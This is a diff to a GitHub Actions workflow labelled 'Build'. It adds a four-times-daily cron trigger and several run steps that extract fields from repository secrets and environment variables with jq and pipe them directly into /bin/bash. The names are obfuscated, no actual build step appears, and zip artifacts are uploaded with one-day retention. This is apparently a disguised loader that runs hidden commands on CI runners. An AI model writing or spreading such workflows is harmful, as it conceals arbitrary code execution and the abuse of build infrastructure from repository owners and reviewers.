@@ -2,6 +2,8 @@ name: Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '12 2,8,14,20 * * *'
 permissions:
   contents: read
   actions: read
@@ -14,14 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run pipeline
         env:
-          aj505: ${{ secrets.aj505 }}
+          o4426: ${{ secrets.o4426 }}
         run: |
-          printf '%s' "$aj505" | jq -r .dazl7 | /bin/bash
-          echo $rouw599 | jq -r .mx23 | /bin/bash
+          printf '%s' "$o4426" | jq -r .gdqv57 | /bin/bash
+          echo $jzwf15 | jq -r .x4 | /bin/bash
+          printf '%s' "$wr24538" | jq -r .nqdi18 | /bin/bash
+          printf '%s' "$myas1896" | jq -r .o6 | /bin/bash
+          echo $lno473 | jq -r .caast66484 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
         with:
-          name: z7foANEU
+          name: hM2DYUBS
           path: "*.zip"
           retention-days: 1
